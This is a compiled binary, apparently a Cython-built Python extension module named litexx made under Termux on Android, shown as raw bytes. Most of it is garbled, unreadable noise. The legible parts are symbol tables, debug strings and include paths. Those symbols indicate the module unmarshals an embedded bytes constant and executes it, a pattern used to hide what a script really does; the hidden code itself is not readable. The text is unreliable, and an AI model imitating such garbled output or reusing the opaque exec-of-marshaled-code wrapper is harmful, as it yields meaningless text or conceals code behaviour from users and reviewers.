·&  %§	  Ã&  %-
+  Ï&  &Û&  Òø  #ô&  À   Ó$ö	  '  $H  '  %p
+  '  %±
+  %'  %]  1'  %|  ='  %›  I'  d'  Rò  *     t4m'   'ø   %4  V'  #'  à   *!$å  «'  $  ·'  %!  Ã'     úõ     -	 V—    Ğ'  ÷  X   : t4Ù'  $º  å'  $Ù  ñ'  $ø  ı'  %  	(  %*  (  %=  !(    (÷      P    ,÷     7	 P—      8÷      V    <÷     7	 V—      L÷     	 P    P÷     7	 P—      #.(    Õ$\  ;(  %7  G(  %J  S(  #`(  8  [$  m(  $;  y(  $û  …(  %|  ‘(  %Á  (  %|  ©(   x  ø     ` V    #¶(  P  ×$°  Ã(  $$  Ï(  %Ã  ó(  %ù  ÿ(    ø     Ä W    ø     7	 W—     #)  h  Ú	$¯  )  $‘  ))  %]  5)  %ü  A)  %C  M)  #`(  €  u$a  m(  $  y(  $A  …(  %Ï  ‘(  %  (  %À  ©(      ú     y	 Q—   '˜  %0  h)      Òø     æ V    Öø     7	 V—      äø     ç W    jù  &   é  Ö  .  "  ‚ù     .   ó      V—   x  »ó      R   #'  °  
+$Û
+  ·'  %ù
+  Ã'   "  ôó        ô  
+    V—   #  È  $  —   #  à  $*  —     Zô      P—      ô     ! V—   #  ø  '$“    #    7	$¼  —    (ó$  ;î  (v)  yî  (“)  ~î  (v)   î  (v)  èî  ()   ï  (¹)  ï  (Ê)  @ï  (à)  ^ï  (-%  |ï  (ö)  ï  (ö)  ¼ï  (*  îï  (#*  *ğ  (Ê)  Cğ  (5*  vğ  (à)  „ğ  (V*  ªğ  (h*  ìğ  („*  ùğ  (*  ñ  (>%  /ñ  (¥*  Mñ  (·*  mñ  (-%  ˜ñ  (È*  µñ  (Ó*  îñ  (ø*  Úò  (
++  îò  (ó$  ó  (+  yó  )QŞó  *0+  ô  +Qv  (È+  /ô  *f-  Fô  +Qv  (È*  kô  (+  ‘ô  )R“õ  (ø*  ¥õ  (‰.  >ö  (
+/  Lö  (!/  yö  (
+/  Íö  (j%  Üö  (h*  ÷  (‘/  Ì÷  (¤/  Ş÷  (¶/   ø  (Ö/  ½ø  (ö/  Òø  (¶/  ù  (0  hú  (0  éú   5  1  D@  á  /u	  ,Œ	  S  ‰ò  ’   :    €˜& S    œ& A     ‚ & O    }¤& Ï    ~¨& I    ¬& C  İ  Äd é  ’  
+ õ  g  Â-Á	7    Á 	Y  ò  Á	_  V  Á	^  ò  Á	  ÷  Â	Y  ÷  Â	9  ÷  Â 6  #    ‹Ø& ”	    ˆˆ  ÷  ’   "    ŒÜ&   ¯  ‰•  ÷  ’   W    à& ¢  ß  †¨  ÷  ’   Æ  ı  …³  ÷  ’   `    ‚¹  ÷  ’  	 ı  9  ‡Â  ÷  ’   =
+    ƒÊ  Q    ’ä& P  {  ŠÓ  ÷  .’  Ä Ô    „íÙ  ,a  ò  †,&  8   ƒ,@  8   „p    ‘°& T    ´& á    ¸&     Ì& w    ”Ğ& e    “Ô& ¼  *  $è& A    $ğ&  3  r  Gô& “ø& “ü& “/  B	D  8   C 	Ô  8   D	L  £  E ¨  ´  t  A->	„  Ô  ? 	R  8   @ Ù  ä  Ÿ  	Ÿ  h    
+   F  8   ì  8   m  8   J
+  8   U
+  8   |  8   {  8    c    $ÿ    (Ø    ,6    0á    4Ş     8Š  â	  &<N    '@    (Dí    )HR  K  +L    ,Pk  K  0Ta    <XZ  %  =\	  8   >`B    ?d   ¯  *  5      ,b
+  ò  …K  V    
+
+    
+   [  6  \  *    —       œ  §  5  š  ±  ¼  ú  Û
+U    
+  Ÿ ?  6     Ò  ¡¥	  ğ  Ù
+¢0½  î  « 0U   î  Ç 0/  î  Ì 0Æ  î  Ğ 0ª  î  Õ  Z   M  Ú R  8   F  	JÊ  g  r  —  
+    Ê   …      6      
+  ª  µ    
+    Ê   …  Ò  
+   ’   ã  î  …  
+    Ê     Ò  t     ü  ’   1àê  *   Ul  E  (C  ë   2±  
+(T  Y     Q   3p
+  J8   4‹  MÖ   5T  Í6|  Í   5h  İ6|  á   3  a8   6Ì  a  6k  a  6ó  aò  6ê  aò  6¬  a8   4)  c8   4ó   b   5·  46|  4   ë  È  U´  p  ‘Ì  p  ‘ş  pƒ1      z  q  B   ¾  q  k   k  q  0  ‚¾í  "^  (ë  ]   r	x  •ë     u P     Åë     y V—   #¤      }	$Š   ±  $   ½  $ß   É  $½   á  %ò   í  %  ù    ,ì     h	 W—    #¤     ~	$H  ±  $[  ½  $  É  ${  á  %°  í  %İ  ù    {ì     h	 W—    #¤  0   	$  ±  $  ½  $[  É  $9  á  %n  í  %›  ù    Êì     h	 W—    #¤  H   €	$Ä  ±  $×  ½  $2  É  $  á  %E  í  %}  ù  #  h   h	$±  —      Âí     ƒ"  Âí     7	 (+!  -ë  (İ$  8ë  (ó$  oë  (%  ±ë  (%  Ãë  (-%  åë  (%  ì  (>%  *ì  (%  Uì  (>%  yì  (%  ¤ì  (>%  Èì  (%  óì  (>%  í  (Y%  Ví  (j%  _í  (Y%  tí  (j%  }í  (Y%  ’í  (j%  ›í  (Y%  °í  (j%  ¹í   7ı  F6!  ;!  Á  œ<_  6!  ? "  6!  @s  Ğ"  AN  å"  D7  8   Ea  8   Fm  8   GT  8   L¯  /$  P €  e$  R$–  e$  S(Î    T,¶    U0\    X4€    Y8•    Z<s  $  _@š  Ø$  cP}    eT  8   gX·    i\"  
+  j`}  8   ld½    mh(  â  †l×  K  ‡pÁ  8   ‰t}    ‹x‚    Œ|0    €S  *  „á  *  ’Œ«	  4$  ”” Õ"  à"  °  –  ê"  õ"  "  8ª  8    Ê   c  Ø#  “  Ô  Ã     ¤    !®    "
+    # e    $$F  8   %(j  ü  &,p  ü  '-_     *0'  8   ,4š  8   -8  8   .<  İ#  /@–  ï#  0D9ˆ  Ò  14 õ"  è#  T  £  û#  ’   $  d  
+£  8    J  8   x  8    4$  ?$    +G  ±  8   ) t  `$  * ?$  p$  e   u$  8     å"  8      š$  Ã  8z  -    4 ò    4/    4o  Ó$  6 š$  $  2¦  .ì  î$   à"  :ä  T  ò   ;£  T  T  ò   2  
+T  T   2‘  
+T  T   2’  :8   T  ò  T   2=  #8   T   <€  3_  •
+8   4ô  –
+¥%  4œ
+  –
+¥%  =4  š
+±%    ü  ’   ü  ’  È 3,  ¥
+8   68  ¥
+×%   é  3ü  ç8   >1  ê 3r   Ô8   >1  â 3˜  ^  6)
+  ^  6‰  ^  6Å  ^8   4¿  b  4Œ  a  4z  `  4“  _  4§  c  >0  • 5Ë  Í6  Íò  6¦
+  Í8   6¬  Î8   6O  Îò  4@  ÏÔ  4Ñ  Ğå"  4:  Ñä&  >0  å é&  ;!  ¥  3º  8   6:  ä&  6¦
+  8   4X    4¢    4·	    4Â    4³    =4–  *    5h  6:  ä&  64    6ó     62     3½	  Q  6º  Q  6  Q  4Œ   RW   5  ÿ6:  ÿä&  64  ÿ  6ó   ÿ  62  ÿ  49     4¤     4×	      3æ  UÔ  6R  U8   4¬  W8   4„  VÔ   3°  @8   6L  @£  6D  @8   6R  @8   4Ú  A8   4¶  A8   4Ò  A8    3Ş  “Ô  6  ”ò  6¦
+  ”8   6¬  •8   6O  •ò  4B  —  4@  –Ô  >0  Æ 5>  c6R  c8   6„  cÔ  4L  e£  4¬  d8   4  d8   =4Ê  wÔ   =4®  }8     ;ı  68   ?  î  ò  ? 7H  6ò  2‹  8   T  ò  8    2W  T  8    2c  "T  ò  8    2Ş  ‚T  ò  8    2¶  +T  ò   ;}  8   T  ò  T   ;V  T  ò   ;Ö  jT  ò  8   ò  ò   ;˜  8   T   ;~  8   T  T  T   7­
+  "T  2É  9T  T  ò   2  #  8   ? 25  T  8    7Ô  T  2  <T  T  T  T  T  8    ;T  8   T   7®  T  2a  8   T  T  T    ü  œ   U  ë  @  i  ë  @2  	  ë  A İ  ë  ·  …  í  Õ  )  ì  (E0  Wü  )Wjü  (V0  tü  (]0  ü  (
++  ˜ü  (ó$  ·ü   Àü  "  Uz  @  ş  Ú  C  (  ¥  B  ;    A6  0  f¡ı  x  Şü     D V   '€  q  )
+  N  'h  Ş  ó   Q  #x0  P  Q$­  …0  $  ‘0  '  @ı     : P«'   W·'  %Ë  Ã'      •ı     \ P—       ‡ı  
+   d P—   #  ˜  g$    #  °  7	$1  —    #  È  h$O      ±ı     7	$m  —    (0  îü  (°0  -ı  )QSı  (+  oı  (
+/  ı   ğı  ¹  U—  î  @¿  Û  î  @‹  Ú  î  @»  ˜  î  +  ö  ñ?  m  Y  ğ  û  )  ï  >0  -"Æ0  Œş      	'à  BtÓ  ˜1    ˆÿ  !   *	$      ÿ     7	$,  —     (ó0  tş  (+  ‚ş  (.0  Óş  (ó$  õş  (ş0  !ÿ  (1  @ÿ  (C1  \ÿ  (^1  ÿ   °û  g   UN  È  @è  )
+  È  6Æ  È“1  6ñ	  È    )  Í  x  øû     Ó P   (
++  ü  *!/  ü  +Qv   ;A  T  T  T   0û  q   Up  Ÿ  @m  )
+  Ÿ  Ê  )     #'  8   $™  «'  %·  Ã'   )Qaû  (
+/  {û  (.0  œû   ;Ê    ò  ? ;ç  æò  T   2½  ‚Ñ/  ò  ò  8    ä  2Ş  FØ#  6!  Ñ/  T  T   2R   	8   Ø#   2Î  !6K  K  î   2Í  !4K  î   2c  ©  T  ò  ? 2q  "C8   ò   <ø  "D2ß  #T  T  T  T   3  3  6Û  3  6_  3   ;É  'T  T   2  "8   T  T   Cê  8   DÄ
+  ›  D4  é0   î0  \  7Ç
+  "T  ;¦  ÓT  T   2Ÿ  $8   !1   &1  
+%&  8   % Ş	  8   % 2½  &
+T  T  T  T   2¹  ',T  ò  8   T  T  !1   ˆ1  Q   y  
+U*  &1  ‘  %   X  f  „          `  §  „  ¢          ¯  ö  ¢  À          ş  M  `  f  À  Ş          A  M  `  f              Q  m          Y    
+  ?  á  ‚  Ò  :          `    
+  ?  á  |          œ
+  µ
+  á  ï          
+  É
+    &  á             ‹  º  7  ¿  >  C          £  º  7  –          À  7    :          C  ‚  Ò  :          a  ‚  Ò  $          u  ”  —  £          ã  	  `  v          f	  j	  è	  ô	          j	  r	  ô	  
+          ä	  è	  ‡    Ğ  ×          ä	  è	  ‡    Ğ  ×          p  †  ”             W  s  •  ¡          Q  §  µ  Á          7  §  µ  Á          Å  É  î  ú          Å  É  î  ú          Í  Ü  ú  ş          ´  è  0  q    É          ob_base sq_inplace_concat shape visitproc tp_init m_init m_slots __pyx_empty_unicode kind wstr f_gen Py_tracefunc __Pyx_InitCachedConstants tp tp_itemsize nb_index tp_getattro tp_flags tp_doc tp_richcompare tp_descr_set tp_cache tp_subclasses value __pyx_moduledef_slots is_unicode __pyx_k_cline_in_traceback PyDictKeysObject f_stackdepth context_ver __Pyx_check_binary_version module attr_name PyErr_WarnEx PyObject_Hash PyUnicode_AsUTF8String PyEval_EvalCode modules Py_hash_t releasebufferproc ml_meth ml_doc tp_dict freefunc PyModuleDef_Slot __pyx_n_s_cline_in_traceback length wchar_t frame PyFrameState recursion_headroom previous trash_delete_nesting PyDict_SetItemString list py_line __pyx_pymod_create ob_type tp_setattr bf_getbuffer getbufferproc tp_clear closure tp_descr_get ma_values hash PyFrameObject context t tstate PyObject_GetAttr PyTraceBack_Here PyErr_Format __Pyx_GetBuiltinName call ob_size nb_inplace_power sq_item objobjargproc long unsigned int get PyObject co_names co_freevars co_linetable PyASCIIObject __Pyx_copy_spec_to_module next f_lasti exc_traceback PyErr_ExceptionMatches PyObject_Not PyDict_SetItem nb_remainder nb_positive mp_ass_subscript tp_iternext ml_flags unsigned char interned ascii spec py_frame mid __Pyx_CreateCodeObjectForTraceback i __Pyx_PyObject_Call tp_as_async nb_bool nb_or tp_methods tp_new __pyx_string_tab __pyx_n_s_main co_code co_extra ob_sval op gilstate_counter message __Pyx_Import PyThreadState ptraceback modname dict_version cf PYGEN_NEXT nb_inplace_or bf_releasebuffer tp_traverse traverseproc doc tp_del _typeobject PyTypeObject m_index __ARRAY_SIZE_TYPE__ s ma_used f_back f_trace_lines b_level c_profilefunc funcname __Pyx_PyExec3 names int __pyx_moduledef PyVarObject nb_inplace_subtract nb_inplace_multiply nb_inplace_matrix_multiply tp_base newfunc int64_t __pyx_lineno __pyx_code_cache count b_handler tracing curexc_type __Pyx_ErrFetchInState PyObject_SetAttr PyDict_Contains PyEval_MergeCompilerFlags PyRun_StringFlags /sdcard/Download am_aiter PYGEN_RETURN nb_divmod nb_negative nb_floor_divide ssizeobjargproc itemsize tp_members m_doc m_free __pyx_cython_runtime encoding __Pyx_StringTabEntry co_flags PyBytesObject f_code f_lineno signed char cframe c_traceobj coroutine_origin_tracking_depth id PyErr_SetString ctversion def __pyx_pyinit_module arg m_base Py_ssize_t getattrfunc reprfunc nb_float PyCFunction tp_alloc tp_vectorcall _object long long unsigned int __pyx_f __pyx_k_builtins state root_cframe ptype __Pyx_PyObject_GetAttrStr tmp_tb cf_feature_version dict_cached_value sq_length tp_call tp_str iternextfunc name tp_version_tag __pyx_k_name co_nlocals co_stacksize __pyx_cfilenm __Pyx_check_single_interpreter f_valuestack rtversion c_line PyImport_GetModuleDict ob PyEval_GetBuiltins am_send nb_lshift nb_rshift mp_subscript tp_setattro m_methods exc_type thread_id __Pyx_InitStrings __pyx_insert_code_object PyTuple_New PyBytes_FromStringAndSize PyObject_SetAttrString clang version 13.0.1 char binaryfunc nb_int nb_inplace_xor tp_mro unsigned int vectorcallfunc m_traverse __pyx_k_marshal PyDictObject PyTupleObject on_delete tb PyList_New __pyx_pymod_exec_litexx __pyx_L0 setattrfunc nb_multiply nb_matrix_multiply format slot __int64_t __pyx_k_import PyModuleDef_Init pvalue PyObject_Dir _py_tmp tp_basicsize nb_true_divide tp_weaklistoffset getiterfunc PyModuleDef_Base __pyx_m uint64_t __pyx_empty_tuple entries _Py_INCREF prev PyTryBlock previous_item dict async_gen_finalizer use_cline_obj tmp_value new_max PyImport_AddModule PyDict_GetItemString PyFrame_New _Py_IS_TYPE code tp_name am_await am_anext tp_as_mapping __pyx_n_s_builtins co_varnames co_opcache_size code_line ma_version_tag moddict exc_state async_gen_firstiter PyModule_GetDict use_cline pos __pyx_bisect_code_objects PyUnicode_FromFormat nb_add nb_subtract inquiry nb_inplace_rshift nb_inplace_and buf internal Py_buffer initproc allocfunc size_t m_copy __pyx_empty_bytes __pyx_n_s_test __Pyx_CodeObjectCacheEntry ma_keys PyListObject f_globals f_locals async_exc _ts level __Pyx_AddTraceback PyUnicode_FromStringAndSize __kernel_ssize_t nb_invert nb_inplace_floor_divide objobjproc getattrofunc PyGetSetDef tp_dictoffset n __pyx_filename __pyx_n_s_name __pyx_n_s_loads _PyOpcache _dictkeysobject ready PyInterpreterState f_builtins c_profileobj o kw tp_getattr PYGEN_ERROR nb_and tp_as_sequence tp_iter set tp_is_gc tp_bases tp_finalize p intern __pyx_clineno co_filename co_opcache f_trace stackcheck_counter curexc_value PyImport_ImportModuleLevelObject PyErr_Occurred PyCode_NewEmpty PyMem_Malloc ob_refcnt tp_vectorcall_offset nb_absolute nb_xor nb_inplace_add sq_contains tp_weaklist __pyx_methods __pyx_dict_cached_value is_str __pyx_k_main co_kwonlyargcount f_iblock f_localsplus curexc_traceback PyInterpreterState_GetID empty_dict tmp PyMem_Realloc PyNumberMethods was_sq_ass_slice sq_inplace_repeat PyMappingMethods hashfunc bufferinfo ml_name tp_getset co_argcount co_zombieframe co_opcache_map f_trace_opcodes PyErr_Clear global_dict locals tp_dealloc destructor mp_length tp_hash richcmpfunc long long int __uint64_t co_posonlyargcount co_consts co_opcache_flag __Pyx_CodeObjectCache compact recursion_depth _cframe filename cython_runtime_dict PyInit_litexx __Pyx_Globals unaryfunc PyAsyncMethods ternaryfunc setattrofunc obj strides __pyx_k_loads __pyx_k_test __pyx_n_s_marshal from_name PyThreadState_Get f_state CFrame PyModule_NewObject __pyx_L1_error py_code Py_GetVersion PyUnicode_InternFromString Py_EnterRecursiveCall __pyx_t_2 PyCompilerFlags tp_as_number PyBufferProcs __pyx_dict_version __pyx_b on_delete_data __pyx_find_code_object PyOS_snprintf PyTuple_Pack __Pyx_GetAttr cf_flags len readonly descrgetfunc m_clear __pyx_kp_b_s_d_d_l_Z_e_e_d_d_S_Ns_s_d_d_l co_firstlineno co_cell2arg c_tracefunc /storage/emulated/0/Download/litexx.c PyMethodDef max_count co_cellvars to_name exc_value __Pyx_InitGlobals __pyx_t_1 sendfunc nb_inplace_remainder sq_concat sq_ass_item PySequenceMethods tp_as_buffer setter m_size PyModuleDef ob_item ob_shash f_blockstack b_type _frame use_tracing trash_delete_later __pyx_t_3 globals PySendResult descrsetfunc m_name main_interpreter_id co_name allocated result bad type tmp_type py_funcname __Pyx__GetModuleGlobalName func tp_repr nb_power PyMemberDef current_id _is exc_info PyObject_GetAttrString __Pyx_CLineForTraceback end PyUnicode_Decode PyUnicode_AsUTF8 Py_LeaveRecursiveCall ssize_t nb_reserved nb_inplace_lshift sq_repeat suboffsets getter __pyx_k_s_d_d_l_Z_e_e_d_d_S_Ns_s_d_d_l __pyx_tuple_ code_object co_weakreflist PyCodeObject allow_none _Py_XDECREF _PyErr_StackItem PyDict_New PyObject_Call __pyx_module_is_main_litexx nb_inplace_true_divide lenfunc ssizeargfunc was_sq_slice ndim tp_free __pyx_d __pyx_n_s_import _Py_DECREF interp _err_stackitem from_list empty_list __Pyx_ErrRestoreInState start     ÿÿÿÿ  |ˆ       àê  *   A…BGƒ_ $       ë  È  A…BI†‡ƒ»   (       àí  H  A…BL†‡ƒÂA   $       0û  q   A…BI†‡ƒwA $       °û  g   A…BE†ƒHA  $        ü  œ   A…BI†‡ƒUA(       Àü  "  A…BI†‡ƒA   (       ğı  ¹  A…BI†‡ƒA      Œ  û      /storage/emulated/0/Download /data/data/com.termux/files/usr/include/asm-generic /data/data/com.termux/files/usr/include/sys /data/data/com.termux/files/usr/include/python3.10 /data/data/com.termux/files/usr/include/python3.10/cpython /data/data/com.termux/files/usr/lib/clang/13.0.1/include /data/data/com.termux/files/usr/include  litexx.c   posix_types.h   types.h   pyport.h   object.h   object.h   methodobject.h   descrobject.h   stddef.h   moduleobject.h   stdint.h   code.h   code.h   dictobject.h   unicodeobject.h   listobject.h   tupleobject.h   bytesobject.h   pystate.h   pystate.h   frameobject.h   pyframe.h   pyerrors.h   dictobject.h   pylifecycle.h   warnings.h   tupleobject.h   bytesobject.h   unicodeobject.h   import.h   listobject.h   traceback.h   pymem.h   ceval.h   abstract.h   ceval.h   compile.h   eval.h   pythonrun.h     àê  Æ
+
+
+Ÿ (º6
+]tKX<	ƒº	t1f
+.	¦u Ï
+X»	"Xh‚äx.¨|tö
+<	!. ‰ufø
+.	ôx.6†‚.†ufû
+J…u‚	ü
+J.ff	L. œufæ
+.	†y¬.6‰‚.ef	L. œufæ
+.	†y¬.6Š‚d‚	L. œufæ
+.	†y¬.6‹‚c‚	L.œufå
+‚/	†y¬.6Œ‚.€ufì¬'ıf‚	/–uX'é
+X‚	/–uX'é
+X‚	/–uX'é
+X‚	/–uXì.6Œ|‚…. ø
+	-‚/	.gêt —ò'.X	"J&J).6J	J04$‡vt.jº+Ö.gX=f.gòAf.f’xfø.‚,ffˆxfú.Ö@f.†xfü.ÖMf.„xfş.7ff@X.ªtf °J</J7/<Îj‚2¹f8<:< Çjº³È Íj<³t./Ìjt¶. Êjt¼X<Jh"‚<hf¶vº/#f3f	fCò	.j7X. Ÿtf
+â.	</t"ú}ffòRf.fï f“sºîÈf’sf$òJfs‚
+ó‚	.sfõ‚
+Y	t Šsffğr&ª0‚	gt¦f	Ì~tãq‚Jofuuuuut	ƒ.İqf¤JXf
+f	.j$f2f=f@fX‚ÉqÈ¯.ÑsX¯..g‚Ğs 	ìÖ.6Â ‚	.¶..6Œ|‚;şJfhff=ò.	ìwf.6”‚Ğw.4².È f	=g ¬sJŠ.ösf	ìJ.6.™‚f óstGt ós.G. ósf	ì.6œ‚$X. ğsf’f	Úw...©f.	×wf.6ª‚0X. âsf .ff àsò: < às. . às.	ìfnŒ|‚ìX”|.ô.Œ|ì..nŒ|•..ësf;ª€Qf¨~f	=Xg ¬s«..gÔqº	¤‚
+2	.Íq¬ì.6Œ|‚·‚$fÉq¬ˆ<øs¬Ù. §sºJŠ.ösf	ì”|.ˆXøs¬@ˆ..øsf	ì-”|.Ùä §sº«..	jÑqX!µJ7ffËqX.ÿq<‚.=ıq<„‚uu°v<	.¶..6Â ‚	.¶..6Œ|‚¶J	.¶..6Œ|‚&ÕJ	ƒ¬.!.	ºP1gf<¾qfÂ‚	J¾q.&ÕJ	H.k&. İpf¤.ƒ.ÛpfÂJ	ªtt.nŒ|‚ÅX.»q.ÅJJ/%Jºq.&ÇJJf0/¶q<#ÏºX	.1‚¤qf4Ü‚	J¤qf1ßJùt<	‡.c
+–	.p.ãJ=Òt‚	.¶..6
+î‚	Ôt. Ê{fÂ È.	ÿ~.X šqf	éffPfMf<¾qfÂJ	fi.»qf®‚ff.	¾w.6Œ|
+µ.Ës»äŠ‚J/%J&/J‚0·q.ÊJ¶q<#Ï‚¬	È±q.öJ(JŠq.+öf	J*/‰q<"øJ	ôt<.6Œ|‚öJ(JŠq. ü.	f„q.9ÿJ0s¼f €qf"ƒ<$ghúpf%†‚.úp.‡Èùpä‡.%.úp.‰Jƒu õpt0ê¬».&g(g$Ÿ"×$uq. Ÿt2
+‘²f	=B	z<./ ¬sJ	¡X.6° §st	¡X./	f *&
+\K	ƒ.†v.
+.mtt.šrt ëä
+’'<	=.’r.ğJ<0	Y.4u	tŒr.öJ	e Ë
+½•s í.f
+ƒ	.ºofÈJ*< ¸of*Èº¸o ÈJ4h -/	eftœ|.	=X/ş.®o.ØJ6< ¨ofÒº	šsf”|fì‚.6Œ|‚ìJ.”|.¶J	.¶.”|JìX ”|.ê‚	ŠsŒ|‚¶J	.Ê{. î 
+
+*.p.ò.„t/	fÔ		f>X	.%/9XO.	1’q<	îf.„„ïo.—.f2f åoÈt/f şo°bƒ×Jìo.¡J@Ûo<¥J“9./ct÷o¨X Øo.¶X	.¶f.n                             ñÿ   `      "   ê  #     /   Pê       A   Ì         R   Œ         ^   t  ˜     q   ˆ         {            „   €         o  `ê      ¤  `     ±  @ê      Û  €ê  /    â  °ê  -                ñÿ—   (& 4     §   ë  È    º   x&      í   ”&      õ   àí  H      ˜&        œ&      1   &      E  ¤&      M  ¨&      U  ¬&      j  d È     {  °&      Š  ´&      ™  ä&      Ã  Ğ&      Ğ  ¸&      â  è&        ğ&      =  À&      h  È&      ˜  Ì&      ¨   ü  œ     ¼  Àü  "    Ê  ğı  ¹    Ø  Ô&      ç  Ü&        °û  g       0û  q     4  ü&      G  ô&      Z  ø&      m  Ø&      €  „&        \&      ¤  •      
+ ¿  à&      Ğ  ¨      
+ ß  ³      
+ í  ¹  	    
+ ú  Â      
+ 
+  Ê  	    
+   Ó  Ä   
+ >  íÙ  	    
+ K  Ú       Y  4       Ö	  4       ˆ             •             É             ñ  €&       ı   '         €&       	  àê  *                  (             :             S             e             u             Œ             Ÿ             «             ¼             Ñ             à             õ                                       *             =             K             Y             f             r             Œ             ¨             »             Ò             í             ş               €&      (             9             P             e             r             }             ˆ             ©             Å             Ú             ê             ù                                       $             >             O             d             u             …             ‘             ¢             °             ½             Î             Ş             ë             	             	             %	             7	             D	             T	             d	             w	             ƒ	             š	             ´	             Ä	              .note.android.ident .dynsym .gnu.version .gnu.version_r .gnu.hash .hash .dynstr .rel.dyn .rel.plt .rodata .eh_frame_hdr .eh_frame .text .plt .data.rel.ro .fini_array .dynamic .got .got.plt .data .bss .comment .debug_loc .debug_abbrev .debug_info .debug_ranges .debug_str .debug_frame .debug_line .symtab .shstrtab .strtab  crtbegin_so.c __dso_handle_const __on_dlclose __on_dlclose_late ndk_build_number ndk_version note_android_ident note_data note_end note_name litexx.c __pyx_moduledef __pyx_pymod_create __Pyx_check_single_interpreter.main_interpreter_id __pyx_m __pyx_pymod_exec_litexx __pyx_empty_tuple __pyx_empty_bytes __pyx_empty_unicode __pyx_d __pyx_b __pyx_cython_runtime __pyx_string_tab __pyx_n_s_name __pyx_n_s_main __pyx_kp_b_s_d_d_l_Z_e_e_d_d_S_Ns_s_d_d_l __pyx_tuple_ __pyx_n_s_marshal __Pyx_CLineForTraceback.__pyx_dict_version __Pyx_CLineForTraceback.__pyx_dict_cached_value __pyx_pymod_exec_litexx.__pyx_dict_version __pyx_pymod_exec_litexx.__pyx_dict_cached_value __pyx_n_s_loads __Pyx_PyObject_Call __Pyx_Globals __Pyx_PyExec3 __pyx_n_s_test __pyx_n_s_cline_in_traceback __Pyx__GetModuleGlobalName __Pyx_GetBuiltinName __pyx_code_cache.2 __pyx_code_cache.0 __pyx_code_cache.1 __pyx_n_s_builtins __pyx_methods __pyx_moduledef_slots __pyx_k_cline_in_traceback __pyx_n_s_import __pyx_k_import __pyx_k_loads __pyx_k_main __pyx_k_marshal __pyx_k_name __pyx_k_s_d_d_l_Z_e_e_d_d_S_Ns_s_d_d_l __pyx_k_test __FRAME_END__ _GLOBAL_OFFSET_TABLE_ __atexit_handler_wrapper __cxa_atexit __cxa_finalize __dso_handle __emutls_unregister_key __register_atfork atexit pthread_atfork __bss_start _end _edata PyInit_litexx PyModuleDef_Init PyThreadState_Get PyInterpreterState_GetID PyExc_ImportError PyErr_SetString PyObject_GetAttrString PyModule_NewObject _Py_Dealloc PyModule_GetDict PyDict_SetItemString _Py_NoneStruct PyExc_AttributeError PyErr_ExceptionMatches PyErr_Clear __stack_chk_guard PyExc_RuntimeError PyOS_snprintf Py_GetVersion PyErr_WarnEx PyTuple_New PyBytes_FromStringAndSize PyUnicode_FromStringAndSize PyImport_AddModule PyObject_SetAttrString PyUnicode_InternFromString PyUnicode_Decode PyObject_Hash __pyx_module_is_main_litexx PyObject_SetAttr PyImport_GetModuleDict PyDict_GetItemString PyTuple_Pack PyList_New PyDict_New PyImport_ImportModuleLevelObject _PyThreadState_UncheckedGet _PyObject_GetDictPtr _Py_FalseStruct _Py_TrueStruct PyObject_Not PyErr_Occurred PyDict_SetItem _PyDict_GetItem_KnownHash PyObject_GetAttr PyUnicode_FromFormat PyUnicode_AsUTF8 PyCode_NewEmpty PyFrame_New PyTraceBack_Here PyMem_Realloc PyMem_Malloc __stack_chk_fail PyExc_NameError PyErr_Format Py_EnterRecursiveCall Py_LeaveRecursiveCall PyObject_Call PyExc_SystemError PyObject_Dir PyDict_Contains PyExc_TypeError PyEval_GetBuiltins PyCode_Type PyUnicode_AsUTF8String PyEval_MergeCompilerFlags PyEval_EvalCode PyRun_StringFlags _DYNAMIC                                                    t  t  ˜                               °                 ÿÿÿo   ¼  ¼  –                *   şÿÿo   T  T                   9   öÿÿo   t  t  0                 C         ¤  ¤  `               I         
+  
+  ¸                 Q   	      ¼  ¼  0               Z   	   B   ì  ì  Ğ              c      2   ¼  ¼  :Ç                 k         øÙ  øÙ                    y         Ú  Ú                    ƒ         ê  Ú  œ                 ‰         °ÿ  °ï  °                          ` `ó  Ì                  ›         , ,ô                    §         4 4ô  Ğ                °          õ  0                  µ         4 4õ  ô                  ¾         (& (ö  X                  Ä         €& €ö  €                  É      0       €ö  Ç                 Ò              G÷  ?                 İ              † U                 ë              Û ¤1                 ÷              B                        0       E ¼                             <` X                              ”a                  )             ¤r        @         1             D{ C                 ;             ‡| ß	                 
